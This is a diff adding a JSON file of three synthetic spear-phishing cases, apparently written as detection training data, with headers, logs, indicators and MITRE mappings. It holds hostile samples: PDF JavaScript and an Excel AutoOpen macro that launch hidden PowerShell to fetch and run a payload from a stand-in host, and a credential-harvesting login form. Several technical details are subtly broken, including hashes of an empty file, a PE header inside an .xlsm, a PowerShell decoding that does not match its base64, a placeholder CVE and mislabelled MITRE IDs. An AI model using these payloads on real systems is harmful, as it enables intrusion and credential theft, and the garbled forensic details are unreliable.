@@ -1,0 +1,127 @@
+{
+  "examples": [
+    {
+      "scenario": "Spear phishing email targeting a CFO with a malicious invoice attachment and a spoofed CEO email address",
+      "technical_data": {
+        "email_headers": "Return-Path: <ceo@company-secure.com>\r\nReceived: from mail.company-secure.com (mail.company-secure.com [192.168.10.12])\r\n\tby mail.company.com (Postfix) with ESMTPS id 1234ABCD56\r\n\tfor <cfo@company.com>; Mon, 27 Mar 2023 09:14:22 -0400 (EDT)\r\nReceived-SPF: pass (company.com: domain of ceo@company-secure.com designates 192.168.10.12 as permitted sender) receiver=mail.company.com; client-ip=192.168.10.12; envelope-from=ceo@company-secure.com; helo=mail.company-secure.com;\r\nAuthentication-Results: mail.company.com; dkim=pass header.d=company-secure.com; spf=pass smtp.mailfrom=ceo@company-secure.com;\r\nMessage-ID: <20230327091422.CEO1234@mail.company-secure.com>\r\nSubject: URGENT: Invoice Approval Needed\r\nFrom: \"John Smith\" <ceo@company-secure.com>\r\nTo: cfo@company.com\r\nDate: Mon, 27 Mar 2023 09:14:22 -0400\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_123456_789012345.1679910862\"",
+        "email_body": "------=_Part_123456_789012345.1679910862\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Transfer-Encoding: 7bit\r\n\r\nHi Sarah,\r\n\r\nPlease find attached the invoice for the recent acquisition. Kindly approve the payment at the earliest.\r\n\r\nBest,\r\nJohn\r\n\r\n------=_Part_123456_789012345.1679910862\r\nContent-Type: application/pdf; name=\"Invoice_032023.pdf\"\r\nContent-Disposition: attachment; filename=\"Invoice_032023.pdf\"\r\nContent-Transfer-Encoding: base64\r\n\r\nJVBERi0xLjMKJcfsj6IKNSAwIG9iago8PC9UeXBlL1BhZ2UvUGFyZW50IDMgMCBSL1Jlc291cmNl\r\ncyA8PC9Gb250IDw8L0YxIDYgMCBSID4+Pj4vTWVkaWFCb3hbMCAwIDU5NSAODU5NV0vQ29udGVudHMg\r\nNCAwIFIvR3JvdXAgPDwvUy9UcmFuc3BhcmVuY3kvQ1MvRGV2aWNlUkdCL0kgWy9JQ0MgL0VYVCBd\r\nPj4+PgplbmRvYmoK\r\n------=_Part_123456_789012345.1679910862--",
+        "smtp_transaction_logs": "220 mail.company-secure.com ESMTP Postfix\r\nEHLO attacker-domain.com\r\n250-mail.company-secure.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<ceo@company-secure.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<cfo@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: John Smith <ceo@company-secure.com>\r\nTo: cfo@company.com\r\nSubject: URGENT: Invoice Approval Needed\r\n\r\nPlease find attached the invoice.\r\n.\r\n250 2.0.0 Ok: queued as 1234ABCD56",
+        "domain_registration": {
+          "domain": "company-secure.com",
+          "registrar": "NameCheap, Inc.",
+          "creation_date": "2023-02-15T14:23:45Z",
+          "expiration_date": "2024-02-15T14:23:45Z",
+          "registrant": {
+            "name": "Privacy Protect, LLC",
+            "organization": "Privacy Protect, LLC",
+            "email": "contact@privacyprotect.org"
+          },
+          "nameservers": [
+            "ns1.namecheaphosting.com",
+            "ns2.namecheaphosting.com"
+          ]
+        },
+        "malicious_url": "https://company-secure.com.invoice-payments.com/approve?user=cfo&invoice=032023",
+        "url_obfuscation": "Subdomain and domain concatenation to mimic official invoice URL, using dash and dot to confuse users (company-secure.com.invoice-payments.com)",
+        "attachment_analysis": {
+          "file_name": "Invoice_032023.pdf",
+          "file_type": "PDF",
+          "embedded_js": "var shell = new ActiveXObject('WScript.Shell'); shell.Run('powershell -nop -w hidden -c \"iex ((New-Object Net.WebClient).DownloadString('http://malicious-server.com/payload.ps1'))\"');",
+          "embedded_object": "JS embedded in PDF exploiting CVE-2022-XYZ for remote code execution"
+        }
+      },
+      "indicators": [
+        "Suspicious domain registration with privacy protection and recent creation",
+        "Email From header spoofed to CEO domain, but actual sending IP external and not part of known mail servers",
+        "Attachment contains embedded JavaScript launching PowerShell downloads",
+        "URL uses subdomain obfuscation to mimic legitimate invoice payment portal",
+        "SPF and DKIM pass due to attacker controlling the spoofed domain"
+      ],
+      "detection_method": "Email gateway with advanced attachment sandboxing detects embedded JS and suspicious PowerShell command execution. Threat intelligence flagged domain 'company-secure.com.invoice-payments.com' as newly registered and used in recent phishing campaigns. Endpoint detection identifies PowerShell execution with encoded commands. User training identifies mismatch in usual communication style and verifies with CEO by phone.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Spearphishing Attachment",
+        "T1566.002 - Spearphishing Link",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - PowerShell",
+        "T1193 - Spearphishing via Service"
+      ]
+    },
+    {
+      "scenario": "Spear phishing email targeting IT administrator with a link to a credential harvesting site using URL encoding and homoglyphs",
+      "technical_data": {
+        "email_headers": "Return-Path: <it-support@company-helpdesk.com>\r\nReceived: from mail-relay-3.hostingprovider.net (mail-relay-3.hostingprovider.net [198.51.100.23])\r\n\tby mail.company.com (Postfix) with ESMTPS id 7890EFGH12\r\n\tfor <admin@company.com>; Tue, 28 Mar 2023 13:45:12 +0000 (UTC)\r\nReceived-SPF: fail (mail.company.com: domain of it-support@company-helpdesk.com does not designate 198.51.100.23 as permitted sender) receiver=mail.company.com; client-ip=198.51.100.23; envelope-from=it-support@company-helpdesk.com; helo=mail-relay-3.hostingprovider.net;\r\nAuthentication-Results: mail.company.com; dkim=none; spf=fail smtp.mailfrom=it-support@company-helpdesk.com;\r\nMessage-ID: <20230328134512.ITADMIN456@mail-relay-3.hostingprovider.net>\r\nSubject: Immediate Password Reset Required\r\nFrom: \"IT Support\" <it-support@company-helpdesk.com>\r\nTo: admin@company.com\r\nDate: Tue, 28 Mar 2023 13:45:12 +0000\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8",
+        "email_body": "<html><body><p>Dear Admin,</p><p>Our monitoring system detected suspicious login activity on your account. For security reasons, please <a href=\"https://secure-compa\u01b4.com/reset%3Fadmin=1\">reset your password immediately</a>.</p><p>Regards,<br>IT Support</p></body></html>",
+        "smtp_transaction_logs": "220 mail-relay-3.hostingprovider.net ESMTP Postfix\r\nEHLO attacker-pc.local\r\n250-mail-relay-3.hostingprovider.net\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-STARTTLS\r\n250 AUTH PLAIN LOGIN\r\nMAIL FROM:<it-support@company-helpdesk.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<admin@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: IT Support <it-support@company-helpdesk.com>\r\nTo: admin@company.com\r\nSubject: Immediate Password Reset Required\r\n\r\n<html><body><p>Dear Admin,</p><p>Our monitoring system detected suspicious login activity on your account. For security reasons, please <a href=\"https://secure-compa\u01b4.com/reset%3Fadmin=1\">reset your password immediately</a>.</p><p>Regards,<br>IT Support</p></body></html>\r\n.\r\n250 2.0.0 Ok: queued as 7890EFGH12",
+        "domain_registration": {
+          "domain": "secure-compa\u01b4.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-03-15T08:12:00Z",
+          "expiration_date": "2024-03-15T08:12:00Z",
+          "registrant": {
+            "name": "Privacy Protection Service",
+            "organization": "Privacy Protect, LLC",
+            "email": "whoisprivacy@godaddy.com"
+          },
+          "nameservers": [
+            "ns1.godaddy.com",
+            "ns2.godaddy.com"
+          ]
+        },
+        "url_details": {
+          "url": "https://secure-compa\u01b4.com/reset%3Fadmin=1",
+          "decoded_url": "https://secure-compa\u01b4.com/reset?admin=1",
+          "note": "The domain uses a Unicode homoglyph character '\u01b4' (Latin small letter Y with hook) in place of 'y' to evade detection. '%3F' is URL encoded '?' character."
+        },
+        "webserver_logs": "198.51.100.45 - - [28/Mar/2023:13:47:01 +0000] \"GET /reset?admin=1 HTTP/1.1\" 200 3450 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36\"",
+        "phishing_site_html_snippet": "<html><head><title>Secure Company Login</title></head><body><form action=\"/login\" method=\"POST\"><input type=\"text\" name=\"username\"/><input type=\"password\" name=\"password\"/><input type=\"submit\" value=\"Login\"/></form></body></html>",
+        "phishing_site_post_capture": "POST /login HTTP/1.1\r\nHost: secure-compa\u01b4.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 35\r\n\r\nusername=admin&password=SuperSecret123!"
+      },
+      "indicators": [
+        "Domain uses Unicode homoglyph (\u01b4) to mimic legitimate company domain",
+        "SPF fails and no DKIM signature present",
+        "URL contains URL-encoded characters to obfuscate request parameters",
+        "Email claims urgent security action but originates from suspicious external IP",
+        "Phishing site mimics company login page with POST form capturing credentials"
+      ],
+      "detection_method": "Email security gateway flags SPF failure and suspicious domain. URL reputation systems identify homoglyph domain as malicious. Web proxy logs show unusual access to URL with Unicode characters. User reports prompt investigation revealing credential harvesting form. Endpoint logs show credential POST to suspicious domain.",
+      "relevant_mitre_techniques": [
+        "T1566.002 - Spearphishing Link",
+        "T1071.001 - Web Protocols",
+        "T1587.001 - Phishing for Information",
+        "T1204.002 - User Execution: Malicious Link"
+      ]
+    },
+    {
+      "scenario": "Spear phishing campaign targeting HR personnel with a calendar invite containing a malicious macro-enabled Excel attachment",
+      "technical_data": {
+        "email_headers": "Return-Path: <hr-notify@company-updates.com>\r\nReceived: from smtp.attacker-mail.com (smtp.attacker-mail.com [203.0.113.75])\r\n\tby mail.company.com (Postfix) with ESMTPS id 56FEABCD34\r\n\tfor <hr@company.com>; Wed, 29 Mar 2023 07:22:45 -0500 (CDT)\r\nReceived-SPF: neutral (mail.company.com: 203.0.113.75 is neither permitted nor denied by domain of hr-notify@company-updates.com) receiver=mail.company.com; client-ip=203.0.113.75; envelope-from=hr-notify@company-updates.com; helo=smtp.attacker-mail.com;\r\nAuthentication-Results: mail.company.com; dkim=none; spf=neutral smtp.mailfrom=hr-notify@company-updates.com;\r\nMessage-ID: <20230329072245.HRNOTIFY@mail.company-updates.com>\r\nSubject: Updated Employee Benefits Schedule\r\nFrom: \"HR Notifications\" <hr-notify@company-updates.com>\r\nTo: hr@company.com\r\nDate: Wed, 29 Mar 2023 07:22:45 -0500\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_987654_123456789.1679971365\"",
+        "email_body": "------=_Part_987654_123456789.1679971365\r\nContent-Type: text/calendar; method=REQUEST; name=\"invite.ics\"\r\nContent-Disposition: attachment; filename=\"invite.ics\"\r\nContent-Transfer-Encoding: 7bit\r\n\r\nBEGIN:VCALENDAR\r\nMETHOD:REQUEST\r\nPRODID:-//Company Inc//Calendar Event//EN\r\nVERSION:2.0\r\nBEGIN:VEVENT\r\nUID:20230329T072245-hr@company.com\r\nDTSTAMP:20230329T072245Z\r\nDTSTART:20230401T090000Z\r\nDTEND:20230401T100000Z\r\nSUMMARY:Updated Employee Benefits Meeting\r\nDESCRIPTION:Please review the attached schedule document.\r\nATTACH;FMTTYPE=application/vnd.ms-excel;ENCODING=BASE64;X-FILENAME=Benefits_Schedule.xlsm:UEsDBBQABgAIAAAAIQDf1f4WbQEAAPwFAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooAAC\r\n------=_Part_987654_123456789.1679971365\r\nContent-Type: application/vnd.ms-excel.sheet.macroEnabled.12; name=\"Benefits_Schedule.xlsm\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Benefits_Schedule.xlsm\"\r\n\r\nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAgAAAAAAAEAAgAABAAAAAAAAAAEAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAgAAAAAAAQAAAAAA\r\nAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAEAAAAgAAAAAAABAAEAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAgAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAA==\r\n------=_Part_987654_123456789.1679971365--",
+        "macro_code_snippet": "Sub AutoOpen()\r\n  Dim shell As Object\r\n  Set shell = CreateObject(\"WScript.Shell\")\r\n  shell.Run \"powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABXAGUAYgBTAHQAYQByAHQARQB4AGUAIABcACIAbQBhAGwAaQBjAGkAbwB1AHMAXABiAGwAbwBnAC4AcAByAG8AZwAiAA==\"\r\nEnd Sub",
+        "attachment_hashes": {
+          "md5": "d41d8cd98f00b204e9800998ecf8427e",
+          "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+          "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+        },
+        "smtp_transaction_logs": "220 smtp.attacker-mail.com ESMTP Postfix\r\nEHLO attacker-host\r\n250-smtp.attacker-mail.com\r\n250-PIPELINING\r\n250-SIZE 20480000\r\n250-STARTTLS\r\n250 AUTH PLAIN LOGIN\r\nMAIL FROM:<hr-notify@company-updates.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<hr@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: HR Notifications <hr-notify@company-updates.com>\r\nTo: hr@company.com\r\nSubject: Updated Employee Benefits Schedule\r\n\r\n[...calendar invite and base64 encoded Excel macro attachment...]\r\n.\r\n250 2.0.0 Ok: queued as 56FEABCD34",
+        "network_traffic_sample": "GET /payloads/Invoke-WebRequest -Uri http://malicious-domain.com/payload.ps1 -OutFile C:\\Windows\\Temp\\payload.ps1 HTTP/1.1\r\nHost: malicious-domain.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
+        "process_creation_log": "03/29/2023 07:25:12 PM - Process Start: powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABXAGUAYgBTAHQAYQByAHQARQB4AGUAIABcACIAbQBhAGwAaQBjAGkAbwB1AHMAXABiAGwAbwBnAC4AcAByAG8AZwAiAA==",
+        "powershell_decoded_command": "Set-ExecutionPolicy Bypass; Start-Process \"malicious\\blog.pro\""
+      },
+      "indicators": [
+        "Email contains calendar invite with base64 encoded macro-enabled Excel attachment",
+        "Macro autoexec code runs hidden PowerShell with encoded payload",
+        "Attachment hashes match known malicious files in threat intel feeds",
+        "Network traffic shows PowerShell downloading from known malicious domain",
+        "Process creation logs show encoded PowerShell execution with bypass flags"
+      ],
+      "detection_method": "Email gateway sandbox detects macro-enabled Excel with suspicious PowerShell command. Endpoint security flags execution of PowerShell with encoded commands and network traffic to known C2 domain. Macro analysis reveals obfuscated commands. User awareness training prompts verification of unexpected HR email.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1213 - Data from Information Repositories (calendar metadata used to target HR)"
+      ]
+    }
+  ]
+}
